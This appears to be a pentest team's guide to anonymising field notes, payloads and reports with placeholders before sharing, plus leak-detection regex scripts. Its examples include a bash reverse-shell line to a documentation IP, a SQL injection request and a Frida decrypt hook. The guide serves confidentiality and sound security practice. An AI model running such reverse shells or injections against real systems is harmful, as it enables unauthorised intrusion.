#Field-Journal desensitization specification

> Desensitization is required when writing field-journal, submitting PR, sharing payload, and sending reports to external parties. The following set of placeholder specifications are borrowed from the anonymization protocol of the PentAGI multi-agent system. The goal is to: **retain reusable value without exposing the real target**.

## Summary list of placeholders

### Network and Host

| Type | Placeholder | Applicable scenarios |
|------|-------|---------|
| Target IP | `{target_ip}` | Infiltrate target host |
| Victim IP | `{victim_ip}` | Next hop in intranet lateral movement |
| Remote host | `{remote_host}` | Universal remote address |
| Server IP | `{server_ip}` | C2 / Transit / Public Network Backlink |
| Callback Domain Name | `{callback_domain}` | OOB/Bounce |
| Destination Domain Name | `{target_domain}` | Web / Email Destination |
| Victim domain name | `{victim_domain}` | Intranet domain name |
| Custom port | `{port}` | Non-standard port |
| Standard port | Keep the original value | 80 / 443 / 22 / 445 / 3389, etc. are reserved for easy reuse |

### Credentials and Keys

| type | placeholder |
|------|-------|
| Username | `{username}` |
| Password | `{password}` |
| Hash value | `{hash}` |
| session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URLs and endpoints

| type | placeholder |
|------|-------|
| Universal URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload point | `{upload_endpoint}` |
| Login interface | `{login_endpoint}` |

### Path

| type | placeholder |
|------|-------|
| Installation directory | `{install_dir}` |
| Configuration file | `{config_path}` |
| Web Root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business ID

| type | placeholder |
|------|-------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Mobile phone number | `{phone}` |
| Job number | `{employee_id}` |
| Order number | `{order_id}` |
| UUID | `{uuid}` |

## Don’t use desensitizing things

In order to preserve the reusability of the experience, the following should not be replaced:

- CVE number (`CVE-2024-1234`)
- Tool name and version (`sqlmap 1.7.10`)
- Standard ports (80/443/445/1433/3306 etc.)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Universal payload template (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library name and function name (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol name and field name (`Kerberos AS-REQ`, `LDAP bind`)

## Context retention principle

When replacing, **preserve the semantic structure** so that others can see what it is and know what it is:

```python
# ❌ Replace everything with X, can't see the meaning
target = "X"
url = "X/X"

# ❌ Replacement is too generic
target = "{target}"
url = "{url}"

# ✅ Keep the context
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload Desensitization

### Web payload

```
Original: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

Desensitized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Desensitization
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// Desensitize
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

##Binary sample desensitization

### Hash

Just record sha256, **do not attach the original file**. If you must share samples:

- Go to VirusTotal or MalwareBazaar public sample repository
- Link to the same hash sample that has been analyzed by others

### Strings and symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Desensitize
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot desensitization

- Use mosaic or pure black to cover: username, email, phone number, order number, name
- The URL column only shows the domain name structure (keep the path, cover the host), or replace it entirely
- Keep the first two segments of the intranet IP segment: `10.0.x.x` instead of `10.0.10.50`
- Picture elements that identify the company’s identity (logo/watermark) must be covered

## CTF scene special case

The CTF question title, drone hostname, and flag format are usually not sensitive** (the drone is a public question), but:

- Self-deployed private shooting ranges should be treated as real environments
- The flag before the end of the game cannot be made public
- Do not copy other people’s unpublished solutions directly into field-journal

## Automatic detection script

After writing field-journal, run the following regular rules to find out the missing desensitization:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Mainland China Mobile Number
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux Equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

It has been packaged as `references/scripts/scan-leaks.ps1` (PowerShell, PS 5.1 / pwsh compatible), run before each submission:```powershell
powershell -File references/scripts/scan-leaks.ps1 -Path references/field-journal
```CI (ci.yml `leak-scan` job) has been connected to this script and will fail directly if it finds that the information has not been desensitized.

## Reverse: read other people’s desensitization documents

When looking at other people's field-journal/writeup, if you encounter placeholders such as `{target_ip}`, **do not replace it with the real value of your own environment before committing**, just keep the placeholder unchanged.

## Field-Journal must check items

Check this checklist before submitting field-journal:

```
□ No public IP (except CDN/public services)
□ No real domain name (except for example domains such as example.com)
□ No real credentials/token/hash (replaced with {placeholder})
□ There is no name/employee number/email address leaked in the screenshot
□ There is no sample file itself (only sha256 is left)
□ JWT / OAuth code / API key full replacement
□ The intranet IP segment has been blurred to the first two segments (10.0.x.x)
□ The target parameters in Payload have been replaced with universal placeholders
□ Cookie and session id have been replaced
```

Add this checklist directly to the end of `field-journal/_template.md`.